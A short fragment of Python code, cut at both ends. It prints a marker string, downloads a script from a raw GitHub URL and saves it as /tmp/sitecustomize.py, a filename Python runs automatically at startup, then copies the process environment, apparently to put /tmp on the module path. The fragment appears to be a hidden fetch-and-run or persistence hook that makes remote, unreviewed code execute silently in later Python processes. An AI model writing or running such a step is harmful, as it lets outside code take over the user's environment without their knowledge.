...
print("ND_RUNTIME_RETIREMENT_ENTRY_V4", flush=True)
urllib.request.urlretrieve("https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/b648712c4be976551e5629c5f5511a31436c93b7/tmp/nd_runtime_retirement_sitecustomize_v2.py", "/tmp/sitecustomize.py")
env = dict(os.environ)
